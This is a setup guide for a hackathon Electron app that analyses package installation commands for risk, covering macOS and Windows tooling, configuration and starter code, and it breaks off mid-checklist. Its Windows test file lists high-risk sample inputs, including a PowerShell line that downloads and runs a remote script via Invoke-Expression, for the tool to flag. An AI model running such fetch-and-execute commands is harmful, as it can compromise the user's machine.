# TryMint: Complete Setup & Development Guide
## macOS Developer + Windows Tester Configuration

---

## 📋 Table of Contents

1. [Tech Stack Overview](#tech-stack-overview)
2. [Free Resources & Libraries](#free-resources--libraries)
3. [Developer 1 Setup (macOS - Main Developer)](#developer-1-setup-macos---main-developer)
4. [Developer 2 Setup (Windows - Tester)](#developer-2-setup-windows---tester)
5. [Project Structure](#project-structure)
6. [GitHub Workflow (Zero Merge Conflicts)](#github-workflow-zero-merge-conflicts)
7. [Development Timeline](#development-timeline)
8. [Testing Strategy](#testing-strategy)
9. [Demo Preparation](#demo-preparation)

---

## Tech Stack Overview

### Final Tech Stack: **Electron + React + SQLite**

| Layer | Technology | Why? |
|-------|-----------|------|
| **Desktop Framework** | Electron 27.x | Cross-platform (macOS + Windows) |
| **Frontend** | React 18.x | Modern UI with component architecture |
| **Styling** | Tailwind CSS 3.x | Rapid styling, no CSS overhead |
| **Build Tool** | Vite 5.x | Fast development and hot reload |
| **Backend Logic** | Node.js 18.x+ | Built into Electron, handles sandboxing |
| **Database** | SQLite (better-sqlite3) | Embedded, zero config, perfect for desktop |
| **Sandboxing** | Node.js child_process + OS tools | Local isolation without Docker/VMs |
| **Packaging** | electron-builder | Creates .exe (Windows) and .dmg (macOS) |

### What We Are NOT Using

- ❌ Docker (too heavy)
- ❌ Virtual Machines (complex setup)
- ❌ MongoDB (overkill, not needed)
- ❌ Cloud backend (everything is local)
- ❌ Full MERN stack (no Express server needed)

---

## Free Resources & Libraries

### Complete Library List (All Free & Open Source)

#### Core Dependencies

| Library | Version | License | Purpose | Installation |
|---------|---------|---------|---------|--------------|
| **electron** | 27.x | MIT | Desktop application wrapper | `npm install electron --save-dev` |
| **react** | 18.x | MIT | UI framework | `npm install react react-dom` |
| **vite** | 5.x | MIT | Build tool & dev server | `npm install vite @vitejs/plugin-react -D` |
| **tailwindcss** | 3.x | MIT | CSS framework | `npm install -D tailwindcss postcss autoprefixer` |
| **better-sqlite3** | 9.x | MIT | SQLite database driver | `npm install better-sqlite3` |

#### Utility Libraries

| Library | Purpose | Installation |
|---------|---------|--------------|
| **chokidar** | Real-time file monitoring | `npm install chokidar` |
| **ps-list** | Process monitoring | `npm install ps-list` |
| **uuid** | License key generation | `npm install uuid` |
| **concurrently** | Run multiple npm scripts | `npm install -D concurrently` |
| **wait-on** | Wait for dev server | `npm install -D wait-on` |
| **electron-builder** | Package app for distribution | `npm install -D electron-builder` |

#### Built-in Node.js Modules (No Installation Needed)

| Module | Purpose |
|--------|---------|
| `child_process` | Execute commands in sandbox |
| `fs/promises` | File system operations |
| `path` | Cross-platform path handling |
| `os` | Operating system utilities |
| `crypto` | Hashing and encryption |

#### Optional (Stretch Goals)

| Library | Purpose | Cost |
|---------|---------|------|
| **openai** | AI-powered summaries | Pay-per-use API |
| **axios** | HTTP requests | Free |

**Total Cost: $0** (excluding optional OpenAI API)

---

### Learning Resources (All Free)

#### JavaScript & Node.js
- **Node.js Official Docs:** https://nodejs.org/docs/latest/api/
- **JavaScript.info:** https://javascript.info/ (comprehensive tutorial)
- **Eloquent JavaScript:** https://eloquentjavascript.net/ (free book)

#### React
- **Official React Tutorial:** https://react.dev/learn
- **React Course (FreeCodeCamp):** https://www.youtube.com/watch?v=bMknfKXIFA8 (12 hours)
- **React Hooks Guide:** https://react.dev/reference/react

#### Electron
- **Electron Quick Start:** https://www.electronjs.org/docs/latest/tutorial/quick-start
- **Electron Tutorial (Traversy Media):** https://www.youtube.com/watch?v=ML743nrkMHw (2 hours)
- **Electron IPC Communication:** https://www.electronjs.org/docs/latest/tutorial/ipc

#### Tailwind CSS
- **Official Tailwind Docs:** https://tailwindcss.com/docs
- **Tailwind CSS Tutorial:** https://www.youtube.com/watch?v=ft30zcMlFao (1.5 hours)
- **Tailwind UI Components:** https://tailwindui.com/components (some free)

#### SQLite & better-sqlite3
- **SQLite Tutorial:** https://www.sqlitetutorial.net/
- **better-sqlite3 Docs:** https://github.com/WiseLibs/better-sqlite3/wiki
- **SQL Basics:** https://www.w3schools.com/sql/

#### Git & GitHub
- **GitHub Skills:** https://skills.github.com/ (interactive tutorials)
- **Git Visual Guide:** https://marklodato.github.io/visual-git-guide/index-en.html
- **Learn Git Branching:** https://learngitbranching.js.org/ (interactive game)

#### Sandboxing & Security
- **Node.js child_process:** https://nodejs.org/api/child_process.html
- **File System Security:** https://nodejs.org/api/fs.html#fs_file_system_flags
- **Process Isolation Techniques:** https://blog.risingstack.com/node-js-security-checklist/

---

## Developer 1 Setup (macOS - Main Developer)

### Prerequisites Check

Open **Terminal** (Applications → Utilities → Terminal):

```bash
# Check existing installations
node --version    # Need 18+
npm --version     # Comes with Node
git --version     # Usually pre-installed
python3 --version # Built into macOS
```

---

### Step 1: Install Homebrew

Homebrew is the package manager for macOS.

```bash
# Install Homebrew
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"

# Add Homebrew to PATH (the installer will show you the exact commands)
# For Apple Silicon Macs (M1/M2/M3):
echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
eval "$(/opt/homebrew/bin/brew shellenv)"

# For Intel Macs:
echo 'eval "$(/usr/local/bin/brew shellenv)"' >> ~/.zprofile
eval "$(/usr/local/bin/brew shellenv)"

# Verify installation
brew --version
```

---

### Step 2: Install Node.js

**Option A: Using Homebrew (Recommended)**

```bash
# Install Node.js 18
brew install node@18

# Link it
brew link node@18

# Verify
node --version   # Should show v18.x.x
npm --version    # Should show 9.x.x or 10.x.x
```

**Option B: Using NVM (More Flexible)**

```bash
# Install NVM (Node Version Manager)
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# Close and reopen Terminal, or run:
source ~/.zshrc

# Install Node.js 18
nvm install 18
nvm use 18
nvm alias default 18

# Verify
node --version
npm --version
```

---

### Step 3: Install Git

```bash
# Check if Git is already installed
git --version

# If not installed or outdated, install via Homebrew
brew install git

# Configure Git with your information
git config --global user.name "Your Name"
git config --global user.email "your.email@example.com"

# Set default branch name to 'main'
git config --global init.defaultBranch main

# Verify configuration
git config --global --list
```

---

### Step 4: Install Visual Studio Code

**Option A: Download Installer**

1. Go to https://code.visualstudio.com/
2. Download for macOS (Universal or Apple Silicon)
3. Open the `.dmg` file
4. Drag VS Code to Applications folder
5. Open VS Code from Applications

**Option B: Using Homebrew**

```bash
# Install VS Code
brew install --cask visual-studio-code

# Verify installation
code --version

# Enable 'code' command in terminal
# Open VS Code → View → Command Palette (⇧⌘P)
# Type: "Shell Command: Install 'code' command in PATH"
```

---

### Step 5: Install VS Code Extensions

Open VS Code and install these extensions:

**Method 1: Via Command Line**

```bash
# Install all required extensions at once
code --install-extension dbaeumer.vscode-eslint
code --install-extension esbenp.prettier-vscode
code --install-extension dsznajder.es7-react-js-snippets
code --install-extension bradlc.vscode-tailwindcss
code --install-extension qwtel.sqlite-viewer
code --install-extension eamodio.gitlens
code --install-extension formulahendry.auto-rename-tag
code --install-extension christian-kohler.path-intellisense
```

**Method 2: Via VS Code GUI**

1. Open VS Code
2. Click Extensions icon (⇧⌘X) or press Cmd+Shift+X
3. Search and install each:
   - **ESLint** (by Microsoft)
   - **Prettier - Code formatter**
   - **ES7+ React/Redux snippets**
   - **Tailwind CSS IntelliSense**
   - **SQLite Viewer**
   - **GitLens**
   - **Auto Rename Tag**
   - **Path Intellisense**

---

### Step 6: Install Xcode Command Line Tools

Required for compiling native Node modules like `better-sqlite3`.

```bash
# Install Xcode Command Line Tools
xcode-select --install

# A popup will appear - click "Install"
# This takes 5-15 minutes depending on your internet

# Verify installation
xcode-select -p
# Should output: /Library/Developer/CommandLineTools

# Verify compiler
gcc --version
# Should show: Apple clang version X.X.X
```

---

### Step 7: Create GitHub Repository

1. Go to https://github.com/new
2. **Repository name:** `trymint`
3. **Description:** "Try before you install - Safe package installation sandbox for developers"
4. **Visibility:** Public (so hackathon judges can see it)
5. ✅ **Add a README file**
6. ✅ **Add .gitignore** → Choose "Node"
7. **License:** MIT (optional but recommended)
8. Click **Create repository**

---

### Step 8: Clone Repository and Setup Project

```bash
# Navigate to your workspace
cd ~
mkdir hackathon
cd hackathon

# Clone your repository (replace with your actual URL)
git clone https://github.com/YOUR-USERNAME/trymint.git
cd trymint

# Verify remote
git remote -v
# Should show your GitHub repo URL

# Create development branch
git checkout -b development
git push -u origin development
```

---

### Step 9: Create Project Structure

```bash
# Create all directories
mkdir -p src/main
mkdir -p src/renderer/components
mkdir -p src/database
mkdir -p src/sandbox
mkdir -p public
mkdir -p docs
mkdir -p tests

# Create essential files
touch src/main/main.js
touch src/main/preload.js
touch src/main/ipc.js
touch src/main/window.js

touch src/renderer/App.jsx
touch src/renderer/main.jsx
touch src/renderer/index.html
touch src/renderer/index.css

touch src/database/schema.js
touch src/database/queries.js
touch src/database/init.js

touch src/sandbox/executor.js
touch src/sandbox/monitor.js
touch src/sandbox/analyzer.js

touch vite.config.js
touch electron-builder.yml
touch .env.example

# Verify structure
ls -R src/
```

**Expected structure:**

```
trymint/
├── .gitignore
├── README.md
├── package.json (will be created next)
├── vite.config.js
├── electron-builder.yml
├── .env.example
├── public/
├── docs/
├── tests/
└── src/
    ├── main/
    │   ├── main.js
    │   ├── preload.js
    │   ├── ipc.js
    │   └── window.js
    ├── renderer/
    │   ├── App.jsx
    │   ├── main.jsx
    │   ├── index.html
    │   ├── index.css
    │   └── components/
    ├── database/
    │   ├── schema.js
    │   ├── queries.js
    │   └── init.js
    └── sandbox/
        ├── executor.js
        ├── monitor.js
        └── analyzer.js
```

---

### Step 10: Initialize npm and Install Dependencies

```bash
# Initialize package.json
npm init -y

# Install Core Dependencies
npm install electron --save-dev
npm install react react-dom

# Install Build Tools
npm install vite @vitejs/plugin-react --save-dev

# Install Tailwind CSS
npm install -D tailwindcss postcss autoprefixer
npx tailwindcss init -p

# Install Database
npm install better-sqlite3

# Install Utilities
npm install chokidar ps-list uuid

# Install Development Tools
npm install -D electron-builder concurrently wait-on eslint prettier

# Optional: AI Integration (can add later)
# npm install openai
```

**This installation will take 5-10 minutes.**

---

### Step 11: Configure package.json

Edit `package.json` and replace the entire file with:

```json
{
  "name": "trymint",
  "version": "1.0.0",
  "description": "Try before you install - Safe package installation sandbox",
  "main": "src/main/main.js",
  "scripts": {
    "dev": "concurrently \"npm run dev:vite\" \"npm run dev:electron\"",
    "dev:vite": "vite",
    "dev:electron": "wait-on http://localhost:5173 && cross-env NODE_ENV=development electron .",
    "build": "vite build",
    "build:mac": "npm run build && electron-builder --mac",
    "build:win": "npm run build && electron-builder --win",
    "build:linux": "npm run build && electron-builder --linux",
    "lint": "eslint src --ext .js,.jsx",
    "format": "prettier --write \"src/**/*.{js,jsx,json,css}\"",
    "clean": "rm -rf dist build release node_modules"
  },
  "keywords": [
    "security",
    "sandbox",
    "developer-tools",
    "package-manager",
    "installation",
    "safety"
  ],
  "author": "Your Team Name",
  "license": "MIT",
  "devDependencies": {
    "@vitejs/plugin-react": "^4.2.1",
    "autoprefixer": "^10.4.16",
    "concurrently": "^8.2.2",
    "electron": "^27.1.3",
    "electron-builder": "^24.9.1",
    "eslint": "^8.56.0",
    "postcss": "^8.4.32",
    "prettier": "^3.1.1",
    "tailwindcss": "^3.4.0",
    "vite": "^5.0.8",
    "wait-on": "^7.2.0"
  },
  "dependencies": {
    "better-sqlite3": "^9.2.2",
    "chokidar": "^3.5.3",
    "ps-list": "^8.1.1",
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "uuid": "^9.0.1"
  },
  "build": {
    "appId": "com.trymint.app",
    "productName": "TryMint",
    "files": [
      "dist/**/*",
      "src/main/**/*",
      "src/database/**/*",
      "src/sandbox/**/*",
      "package.json"
    ],
    "directories": {
      "buildResources": "public",
      "output": "release"
    },
    "mac": {
      "target": ["dmg", "zip"],
      "category": "public.app-category.developer-tools"
    },
    "win": {
      "target": ["nsis", "portable"]
    }
  }
}
```

**Note:** Install `cross-env` for Windows compatibility:

```bash
npm install -D cross-env
```

---

### Step 12: Create Configuration Files

#### A. vite.config.js

```bash
cat > vite.config.js << 'EOF'
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import path from 'path'

export default defineConfig({
  plugins: [react()],
  base: './',
  build: {
    outDir: 'dist/renderer',
    emptyOutDir: true,
  },
  server: {
    port: 5173,
    strictPort: true,
  },
  resolve: {
    alias: {
      '@': path.resolve(__dirname, './src/renderer'),
    },
  },
})
EOF
```

#### B. tailwind.config.js

```bash
cat > tailwind.config.js << 'EOF'
/** @type {import('tailwindcss').Config} */
export default {
  content: [
    "./index.html",
    "./src/renderer/**/*.{js,jsx}",
  ],
  theme: {
    extend: {
      colors: {
        'trymint': {
          50: '#f0fdf4',
          100: '#dcfce7',
          500: '#10b981',
          600: '#059669',
          700: '#047857',
        },
        'risk': {
          low: '#10b981',
          medium: '#f59e0b',
          high: '#ef4444',
        }
      },
      animation: {
        'pulse-slow': 'pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite',
      }
    },
  },
  plugins: [],
}
EOF
```

#### C. .env.example

```bash
cat > .env.example << 'EOF'
# OpenAI API Key (optional - for AI summaries)
OPENAI_API_KEY=your_api_key_here

# Development Mode
NODE_ENV=development
EOF
```

#### D. Update .gitignore

```bash
cat > .gitignore << 'EOF'
# Dependencies
node_modules/
.pnp
.pnp.js

# Testing
coverage/
*.log

# Production builds
dist/
build/
release/
out/

# Database files (optional - discuss with team)
*.db
*.sqlite
*.sqlite3

# Environment variables
.env
.env.local
.env.development.local
.env.test.local
.env.production.local

# OS files
.DS_Store
.DS_Store?
._*
.Spotlight-V100
.Trashes
ehthumbs.db
Thumbs.db
desktop.ini

# IDE
.vscode/
!.vscode/extensions.json
.idea/
*.swp
*.swo
*~
.project
.classpath
.settings/
*.sublime-workspace
*.sublime-project

# Electron
.electron/
app/dist/

# Logs
logs/
*.log
npm-debug.log*
yarn-debug.log*
yarn-error.log*
pnpm-debug.log*

# Temporary files
tmp/
temp/
*.tmp

# Mac specific
.AppleDouble
.LSOverride
Icon
EOF
```

---

### Step 13: Create Starter Code Files

#### A. Electron Main Process (src/main/main.js)

```javascript
const { app, BrowserWindow } = require('electron');
const path = require('path');
const { initDatabase } = require('../database/schema');

let mainWindow;
let db;

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1400,
    height: 900,
    minWidth: 1000,
    minHeight: 600,
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js'),
    },
    titleBarStyle: 'hiddenInset',
    backgroundColor: '#f9fafb',
  });

  // Load the app
  if (process.env.NODE_ENV === 'development') {
    mainWindow.loadURL('http://localhost:5173');
    mainWindow.webContents.openDevTools();
  } else {
    mainWindow.loadFile(path.join(__dirname, '../../dist/renderer/index.html'));
  }

  mainWindow.on('closed', () => {
    mainWindow = null;
  });
}

app.whenReady().then(() => {
  // Initialize database
  db = initDatabase();
  console.log('Database initialized');

  createWindow();

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    if (db) db.close();
    app.quit();
  }
});

app.on('before-quit', () => {
  if (db) db.close();
});
```

#### B. Preload Script (src/main/preload.js)

```javascript
const { contextBridge, ipcRenderer } = require('electron');

// Expose protected methods that allow the renderer process to use
// the ipcRenderer without exposing the entire object
contextBridge.exposeInMainWorld('electron', {
  // Command analysis
  analyzeCommand: (command) => ipcRenderer.invoke('analyze-command', command),
  
  // History
  getHistory: () => ipcRenderer.invoke('get-history'),
  getScanDetails: (scanId) => ipcRenderer.invoke('get-scan-details', scanId),
  
  // License
  validateLicense: (key) => ipcRenderer.invoke('validate-license', key),
  
  // App info
  getAppVersion: () => ipcRenderer.invoke('get-app-version'),
});
```

#### C. React Entry Point (src/renderer/main.jsx)

```javascript
import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App'
import './index.css'

ReactDOM.createRoot(document.getElementById('root')).render(
  <React.StrictMode>
    <App />
  </React.StrictMode>,
)
```

#### D. HTML Template (src/renderer/index.html)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TryMint - Try Before You Install</title>
</head>
<body>
  <div id="root"></div>
  <script type="module" src="/src/renderer/main.jsx"></script>
</body>
</html>
```

#### E. Tailwind CSS (src/renderer/index.css)

```css
@tailwind base;
@tailwind components;
@tailwind utilities;

@layer base {
  body {
    @apply bg-gray-50 text-gray-900;
  }
}

@layer components {
  .btn-primary {
    @apply px-6 py-2 bg-trymint-500 text-white rounded-lg hover:bg-trymint-600 transition-colors font-medium;
  }
  
  .btn-secondary {
    @apply px-6 py-2 bg-gray-200 text-gray-800 rounded-lg hover:bg-gray-300 transition-colors font-medium;
  }
  
  .card {
    @apply bg-white rounded-xl shadow-sm border border-gray-200 p-6;
  }
}
```

#### F. React App Component (src/renderer/App.jsx)

```javascript
import React, { useState } from 'react'

function App() {
  const [command, setCommand] = useState('')
  const [isAnalyzing, setIsAnalyzing] = useState(false)
  const [result, setResult] = useState(null)

  const handleAnalyze = async () => {
    if (!command.trim()) return;
    
    setIsAnalyzing(true)
    setResult(null)
    
    try {
      // This will connect to Electron IPC later
      console.log('Analyzing command:', command)
      
      // Simulate analysis for now
      setTimeout(() => {
        setResult({
          riskLevel: 'low',
          message: 'Command looks safe (Demo mode - connect to backend later)'
        })
        setIsAnalyzing(false)
      }, 2000)
      
    } catch (error) {
      console.error('Error analyzing command:', error)
      setIsAnalyzing(false)
    }
  }

  const getRiskColor = (level) => {
    const colors = {
      low: 'text-risk-low',
      medium: 'text-risk-medium',
      high: 'text-risk-high',
    }
    return colors[level] || 'text-gray-500'
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 p-8">
      <div className="max-w-5xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-5xl font-bold text-gray-900 mb-2">
            TryMint
          </h1>
          <p className="text-xl text-gray-600">
            Try before you install - Analyze package installations safely
          </p>
        </div>

        {/* Command Input Card */}
        <div className="card mb-6">
          <label className="block text-sm font-semibold text-gray-700 mb-3">
            Enter Installation Command
          </label>
          <div className="flex gap-3">
            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              onKeyPress={(e) => e.key === 'Enter' && handleAnalyze()}
              placeholder="npm install package-name"
              className="flex-1 px-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-trymint-500 focus:border-transparent outline-none transition-all"
              disabled={isAnalyzing}
            />
            <button
              onClick={handleAnalyze}
              disabled={isAnalyzing || !command.trim()}
              className="btn-primary disabled:opacity-50 disabled:cursor-not-allowed min-w-[120px]"
            >
              {isAnalyzing ? 'Analyzing...' : 'Analyze'}
            </button>
          </div>
        </div>

        {/* Results Card */}
        {result && (
          <div className="card">
            <h2 className="text-2xl font-semibold mb-4">Analysis Result</h2>
            <div className="space-y-3">
              <div>
                <span className="text-sm font-medium text-gray-600">Risk Level: </span>
                <span className={`text-lg font-bold uppercase ${getRiskColor(result.riskLevel)}`}>
                  {result.riskLevel}
                </span>
              </div>
              <p className="text-gray-700">{result.message}</p>
            </div>
          </div>
        )}

        {/* Loading State */}
        {isAnalyzing && (
          <div className="card">
            <div className="flex items-center justify-center py-12">
              <div className="text-center">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-trymint-500 mx-auto mb-4"></div>
                <p className="text-gray-600">Analyzing command in sandbox...</p>
              </div>
            </div>
          </div>
        )}

        {/* Placeholder for empty state */}
        {!result && !isAnalyzing && (
          <div className="card">
            <div className="text-center py-12 text-gray-500">
              <svg className="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
              <p className="text-lg">Enter a command to get started</p>
              <p className="text-sm mt-2">We'll analyze it safely before any actual installation</p>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}

export default App
```

#### G. Database Schema (src/database/schema.js)

```javascript
const Database = require('better-sqlite3');
const path = require('path');
const { app } = require('electron');
const fs = require('fs');

function initDatabase() {
  // Get user data directory
  const userDataPath = app.getPath('userData');
  
  // Ensure directory exists
  if (!fs.existsSync(userDataPath)) {
    fs.mkdirSync(userDataPath, { recursive: true });
  }
  
  const dbPath = path.join(userDataPath, 'trymint.db');
  console.log('Database path:', dbPath);
  
  const db = new Database(dbPath);
  
  // Enable WAL mode for better performance
  db.pragma('journal_mode = WAL');
  
  // Create tables
  db.exec(`
    -- Scans table
    CREATE TABLE IF NOT EXISTS scans (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      command TEXT NOT NULL,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      risk_level TEXT CHECK(risk_level IN ('low', 'medium', 'high')),
      risk_score INTEGER,
      duration_ms INTEGER,
      status TEXT CHECK(status IN ('completed', 'failed', 'cancelled', 'running')),
      ai_summary TEXT,
      error_message TEXT
    );

    -- File changes table
    CREATE TABLE IF NOT EXISTS file_changes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      scan_id INTEGER NOT NULL,
      file_path TEXT NOT NULL,
      change_type TEXT CHECK(change_type IN ('created', 'modified', 'deleted')),
      file_size INTEGER,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (scan_id) REFERENCES scans(id) ON DELETE CASCADE
    );

    -- Network activity table
    CREATE TABLE IF NOT EXISTS network_activity (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      scan_id INTEGER NOT NULL,
      url TEXT NOT NULL,
      method TEXT,
      response_code INTEGER,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (scan_id) REFERENCES scans(id) ON DELETE CASCADE
    );

    -- Processes table
    CREATE TABLE IF NOT EXISTS processes (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      scan_id INTEGER NOT NULL,
      process_name TEXT NOT NULL,
      pid INTEGER,
      command_line TEXT,
      timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
      FOREIGN KEY (scan_id) REFERENCES scans(id) ON DELETE CASCADE
    );

    -- Licenses table
    CREATE TABLE IF NOT EXISTS licenses (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      license_key TEXT UNIQUE NOT NULL,
      license_type TEXT CHECK(license_type IN ('FREE', 'PRO')),
      created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
      expires_at DATETIME,
      user_email TEXT,
      is_active BOOLEAN DEFAULT 1,
      max_scans INTEGER
    );

    -- Create indexes
    CREATE INDEX IF NOT EXISTS idx_scans_timestamp ON scans(timestamp DESC);
    CREATE INDEX IF NOT EXISTS idx_scans_status ON scans(status);
    CREATE INDEX IF NOT EXISTS idx_file_changes_scan ON file_changes(scan_id);
    CREATE INDEX IF NOT EXISTS idx_network_activity_scan ON network_activity(scan_id);
    CREATE INDEX IF NOT EXISTS idx_processes_scan ON processes(scan_id);
    CREATE INDEX IF NOT EXISTS idx_licenses_key ON licenses(license_key);
  `);

  console.log('Database initialized successfully');
  
  return db;
}

module.exports = { initDatabase };
```

---

### Step 14: Test the Setup

```bash
# Make sure you're in the project directory
cd ~/hackathon/trymint

# Start the development server
npm run dev
```

**Expected behavior:**
1. Terminal shows Vite compiling
2. Terminal shows "Database initialized"
3. Electron window opens with TryMint UI
4. DevTools are open showing console
5. No errors in console
6. You can type in the input field
7. Clicking "Analyze" shows loading state

**Troubleshooting:**

If you see errors about `better-sqlite3`:
```bash
npm rebuild better-sqlite3
```

If Electron doesn't open:
```bash
# Check if Vite is running
curl http://localhost:5173

# If not, run them separately:
# Terminal 1:
npm run dev:vite

# Terminal 2 (after Vite is ready):
npm run dev:electron
```

---

### Step 15: Commit Initial Setup

```bash
# Check status
git status

# Add all files
git add .

# Commit
git commit -m "Initial Electron + React + Tailwind + SQLite setup

- Configured Vite for React development
- Setup Electron main and renderer processes
- Integrated Tailwind CSS for styling
- Initialized SQLite database with schema
- Created basic UI with command input
- All dependencies installed and working"

# Push to development branch
git push origin development
```

---

## Developer 2 Setup (Windows - Tester)

### Prerequisites Check

Open **PowerShell** (search for it in Start menu):

```powershell
# Check existing installations
node --version    # Need 18+
npm --version     # Comes with Node
git --version     # Need to install
python --version  # Need to install
```

---

### Step 1: Install Node.js

1. Go to https://nodejs.org/
2. Download **LTS version** (18.x or higher)
3. Run the installer (`.msi` file)
4. **Important:** During installation:
   - ✅ Check "Automatically install the necessary tools"
   - ✅ Check "Add to PATH"
5. Click through the installation
6. **Restart your computer** after installation

After restart, verify:

```powershell
node --version   # Should show v18.x.x
npm --version    # Should show 9.x.x or higher
```

---

### Step 2: Install Git

1. Go to https://git-scm.com/download/win
2. Download the installer
3. Run the installer with these settings:
   - **Editor:** Use Visual Studio Code (or your preference)
   - **PATH:** Git from the command line and 3rd-party software
   - **Line endings:** Checkout Windows-style, commit Unix-style
   - **Terminal:** Use Windows' default console window
   - Everything else: Default settings
4. Click through and finish

Verify installation:

```powershell
git --version

# Configure Git
git config --global user.name "Your Name"
git config --global user.email "your.email@example.com"
git config --global init.defaultBranch main
```

---

### Step 3: Install Python (Required for better-sqlite3)

1. Go to https://www.python.org/downloads/
2. Download Python 3.11 or 3.12
3. Run the installer
4. **Critical:** ✅ Check "Add Python to PATH" at the bottom
5. Click "Install Now"
6. After installation completes, click "Disable path length limit" if prompted

Verify:

```powershell
python --version   # Should show Python 3.11.x or 3.12.x
```

---

### Step 4: Install Visual Studio Code

1. Go to https://code.visualstudio.com/
2. Download for Windows
3. Run the installer
4. **Important settings during install:**
   - ✅ Add "Open with Code" to context menu
   - ✅ Add to PATH
   - ✅ Register Code as an editor for supported file types
5. Complete installation

---

### Step 5: Install VS Code Extensions

Open VS Code and install these extensions (same as macOS developer):

**Via Command Palette:**
1. Press `Ctrl+Shift+P`
2. Type: "Extensions: Install Extensions"
3. Search and install each:

- **ESLint**
- **Prettier - Code formatter**
- **ES7+ React/Redux/React-Native snippets**
- **Tailwind CSS IntelliSense**
- **SQLite Viewer**
- **GitLens**

---

### Step 6: Install Windows Build Tools

**Open PowerShell as Administrator** (right-click PowerShell → Run as Administrator):

```powershell
# Install windows-build-tools
npm install -g windows-build-tools

# This installs Python 2.7 and Visual Studio Build Tools
# Takes 15-30 minutes
# Don't close the window until it says "Successfully installed"
```

**Alternative (if above doesn't work):**

Download Visual Studio Build Tools manually:
1. Go to https://visualstudio.microsoft.com/downloads/
2. Scroll to "Tools for Visual Studio"
3. Download "Build Tools for Visual Studio 2022"
4. Run installer
5. Select "Desktop development with C++"
6. Install

---

### Step 7: Clone the Repository

```powershell
# Create workspace directory
cd ~
mkdir hackathon
cd hackathon

# Clone the repository (get URL from Developer 1)
git clone https://github.com/YOUR-TEAM/trymint.git
cd trymint

# Checkout development branch
git checkout development

# Verify
git branch
# Should show: * development
```

---

### Step 8: Install Project Dependencies

```powershell
# Make sure you're in the project directory
cd ~/hackathon/trymint

# Install all dependencies
npm install

# This will take 10-15 minutes on Windows
# You might see some warnings - that's normal
# Wait until you see "added XXX packages"
```

**Common issues:**

If `better-sqlite3` fails to install:
```powershell
# Rebuild it
npm rebuild better-sqlite3

# If still failing, try:
npm install better-sqlite3 --build-from-source
```

---

### Step 9: Test the Application

```powershell
# Start the development server
npm run dev

# Wait for:
# 1. "VITE v5.x.x ready in XXX ms"
# 2. Electron window to open
```

**Expected behavior:**
- Electron window opens with TryMint UI
- No errors in the DevTools console
- You can type in the command input
- Clicking "Analyze" shows loading state

**If Electron doesn't open:**

Open two separate PowerShell windows:

**Window 1:**
```powershell
npm run dev:vite
```

**Window 2 (after Vite is ready):**
```powershell
npm run dev:electron
```

---

### Step 10: Setup Testing Environment

Create a test commands file:

```powershell
# Create tests directory
mkdir tests
cd tests

# Create test commands file
New-Item -Path "test-commands.md" -ItemType File
```

Edit `tests/test-commands.md` and add:

```markdown
# Test Commands for TryMint (Windows)

## Low Risk Commands
```powershell
echo "Hello World"
mkdir test_directory
type nul > test_file.txt
dir
```

## Medium Risk Commands
```powershell
npm install lodash
pip install requests
curl https://example.com
```

## High Risk Commands (Safe for Testing)
```powershell
# These should trigger warnings
curl https://unknown-domain.com/script.ps1
powershell -c "Invoke-WebRequest https://example.com/install.ps1 | Invoke-Expression"
```

## Windows-Specific Tests
```powershell
# Test paths with backslashes
cd C:\Users\Public
mkdir "test folder with spaces"

# Test environment variables
echo %USERPROFILE%
echo %TEMP%
```

## DO NOT TEST
- Real malware URLs
- Commands with `Remove-Item -Recurse -Force`
- Commands modifying system files
```

---

### Step 11: Create Bug Report Template

```powershell
cd tests
New-Item -Path "BUG_REPORT_TEMPLATE.md" -ItemType File
```

Edit and add:

```markdown
## Bug Report

**Date:** 
**Reported by:** Developer 2 (Windows Tester)
**Branch:** 
**Severity:** [Critical / High / Medium / Low]

### Environment
- OS: Windows 11 (or Windows 10)
- Node.js version: 
- Electron version: 
- npm version: 

### Description
[Brief description of the bug]

### Steps to Reproduce
1. 
2. 
3. 

### Expected Behavior
[What should happen]

### Actual Behavior
[What actually happens]

### Screenshots
[Attach if relevant]

### Console Errors
```
[Paste error messages from DevTools console]
```

### Additional Notes
[Any other relevant information]
```

---

### Step 12: Daily Testing Checklist

Create `tests/TESTING_CHECKLIST.md`:

```markdown
# Daily Testing Checklist - Developer 2 (Windows)

## Morning Setup (After Developer 1 pushes)
- [ ] Open PowerShell
- [ ] `cd ~/hackathon/trymint`
- [ ] `git checkout development`
- [ ] `git pull origin development`
